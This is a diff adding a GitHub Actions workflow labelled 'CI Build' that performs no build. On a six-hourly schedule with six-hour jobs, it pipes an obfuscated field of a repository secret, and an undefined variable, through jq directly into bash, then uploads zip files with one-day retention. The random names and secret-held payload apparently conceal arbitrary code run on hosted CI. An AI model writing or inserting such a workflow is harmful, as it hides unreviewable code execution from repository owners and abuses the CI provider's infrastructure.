@@ -1,0 +1,30 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          jc235: ${{ secrets.jc235 }}
+        run: |
+          printf '%s' "$jc235" | jq -r .tmucx64 | /bin/bash
+          echo $ape5 | jq -r .rqnz73400 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: g0xgsufn
+          path: "*.zip"
+          retention-days: 1
